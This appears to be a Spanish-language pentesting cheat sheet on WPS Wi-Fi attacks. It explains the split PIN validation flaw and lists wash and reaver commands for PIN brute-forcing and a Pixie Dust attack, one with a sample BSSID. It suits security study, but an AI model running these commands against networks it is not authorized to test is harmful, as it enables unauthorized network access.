# Info

- **WPS(Wi-FI Protected setup)** fue creado para unificar a los proveedores de tencología con el fin de compartir passphrases WPA y WPA2 de manera segura utilizando métodos diferentes.
- Permite en muchos casos configurar dispositivos fácil para usuarios sin conocimiento (al punto de que en la mayoría de los casos lo único que hay que poner es un pin o tocar un botón)

# Roles

WPS distingue 2 roles

| Rol | Desc |
|----|----|
| Enrollee | Un dispositivo intentando conectarse a la red |
| Registrar | configura los enrollees para que se unan a la red |



# Teoría del ataque

Los ataques se dan sobre la implementación basada en pin.

La validación del PIN se realiza en dos partes. Se valida la primera mitad (primeros 4 dígitos), luego la segunda mitad(3) y el último número es una suma de comprobación.

La primera mitad del pin se valida entre los mensajes M1 a M4. SI recibimos el M5 quiere decir que es correcto. El si la segunda mitad es correcta recibimos el M7 junto con la config.


# Ataque

### Buscar redes WEP

    wash -i <interfaz_mon>

### Atacar 

    sudo reaver -b <BSSID> -i <interfaz> -v -c <channel>

### PixieWPS attack

    sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K
